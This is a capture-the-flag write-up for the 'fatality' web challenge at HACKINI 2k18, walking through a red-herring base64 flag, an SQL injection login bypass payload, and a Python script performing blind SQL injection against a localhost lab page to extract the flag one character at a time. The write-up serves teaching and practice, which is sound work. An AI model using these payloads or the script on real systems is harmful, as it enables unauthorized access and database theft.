@@ -1,0 +1,100 @@
+#WRITEUP #HACKINI2k18 #WEB # FATALITY_150 #BRAHIMI ZAKARIA
+
+Hi all, a little late but I did not forget you for the writeup of the web challenge that was not resolved by any team at the HACKINI CTF. It is called 'fatality' and had 150 points.
+The task is not too difficult overall, but contains little effect that push you to think outside the box.
+Basically, the home page only contains a web form that asks you to authenticate yourself to access the restricted space. Indeed, no information is given to you in advance. But if you dig deeply, you will surely get some.
+
+
+Let's get right to the point. As there is a login form, it is clear that we need the correct username and password to authenticate.
+
+You can take your time trying combinations of login / password or trying to brute-force the form, but you will not go further.
+
+In the source code of the web page (CTRL + U) some things can catch our eyes.
+
+The first thing is the hidden field that has as value:
+SEFDS0lOSXtUaGlzX0lzX0FfUmVkaGVycmluZ30 =
+
+It looks like a base64-encoded text. By decoding this one, we obtain:
+HACKINI {This_Is_A_Redherring}
+
+Hmmm .. not really interesting after all !! it looks like a fake flag since the word redherring appears on it (see https://en.wikipedia.org/wiki/Red_herring)
+
+Let's try harder.
+
+Another interesting thing is the word 'guest' foundable at the end of the source code. It seems to be a valid login. But the password is missing.
+
+Since the username is given to you, you must understand that the login field is not injectable. You must deal with the password field.
+
+The correct payload to pass is a little irregular. There it is:
+')) or 1 = 1 #
+
+
+Why like that? Because the SQL query behind look like this:
+AND mdp = SHA1 (md5 ('$ _ POST [' password] '))
+
+Doing it this way doesn't increase the robustness of the hash but it was not the goal. ^^
+
+I think that was the hardest step of the challenge.
+
+By injecting correctly the password field and by gaining access, it just takes you to another web page that shows you messages "Welcom!" and "Nothing is here".
+
+This should lead you to realize that there is nothing special in the space.
+
+Those messages are here just to be used in the context of a blind injection
+
+You only have one corner to look for, it's the database.
+
+A hint was given in the meantime which is :
+flag everywhere
+
+This is a classical HINT which means that either the table name or the column name you have to look for is named 'flag'.
+
+Since your injection must be in a BLIND way, a script is more or less required.
+
+The script below is pretty simple, it will inject the correct payload to get the length of the flag in the right place. Next, it will do many sql injections to get the flag char by char from the right place too since it will not be possible to do otherwise because we are dealing with a blind injection.
+
+
+                        import requests
+                        import re
+
+                        trouve=0
+                        longueur=0
+
+                        while (trouve==0):
+                               payload="')) or (select length(flag) from flag)="+str(longueur)+"#"
+                               requette={'login':"guest",'password':payload}
+                               resultat=requests.post('http://localhost/web/fatality_150/index.php', data=requette).content
+                               res=re.search("Welcom  !",resultat)
+                               if res is not None:
+                                     trouve=1
+                               else:
+                                     longueur+=1
+
+
+                        print "Length of the flag is : " + str(longueur)
+
+                        trouve=0
+                        length=1
+                        caractere=32
+                        flag=""
+
+                        while(trouve==0):
+                               payload="')) or ascii(substring((select flag from flag),"+str(length)+",1))="+str(caractere)+"#"
+                               requette={'login':'guest','password':payload}
+                               resultat=requests.post('http://localhost/web/fatality_150/index.php',data=requette).content
+                               res=re.search("Welcom  !",resultat)
+                               if res is not None:
+                                     if (length!=longueur):
+                                            flag+=chr(caractere)
+                                            length+=1
+                                            caractere=32
+                                     else:
+                                            flag+=chr(caractere)
+                                            trouve=1
+                               else:
+                                     caractere+=1
+
+                        print ("The flag is : %s " % flag)
+
+
+Good reading
